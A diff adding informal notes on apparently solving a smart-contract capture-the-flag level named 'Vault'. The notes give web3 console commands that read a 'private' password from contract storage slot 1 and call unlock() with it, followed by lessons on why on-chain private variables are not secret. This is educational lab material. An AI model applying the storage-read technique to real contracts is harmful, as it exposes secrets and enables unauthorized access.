@@ -1,0 +1,24 @@
+we aims to unlock the contract, but i suffered a bug :
+  that is :
+  creation of Vault errored: Error encoding arguments: Error: invalid arrayify value (argument="value", value="Howareyou1234", code=INVALID_ARGUMENT, version=bytes/5.5.0)
+
+
+console:
+
+web3.eth.getStorageAt(contract.address,1, function(x,y) {alert(web3.utils.toAscii(y))})
+    //show the passward on the top of the edge
+
+contract.unlock(web3.utils.fromAscii("A very strong secret password :)"))
+    //this code is a right method to solve this level, i suddenly try to use web3.utils and find this way, there is no way to solve this level at now unless use my way.
+    //  2022/4/1
+
+await contract.locked()
+    //true -> false,successful attack
+    
+It's important to remember that marking a variable as private only prevents other contracts from accessing it. 
+State variables marked as private and local variables are still publicly accessible.
+To ensure that data is private, it needs to be encrypted before being put onto the blockchain. 
+In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. 
+ZK-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
+
+    
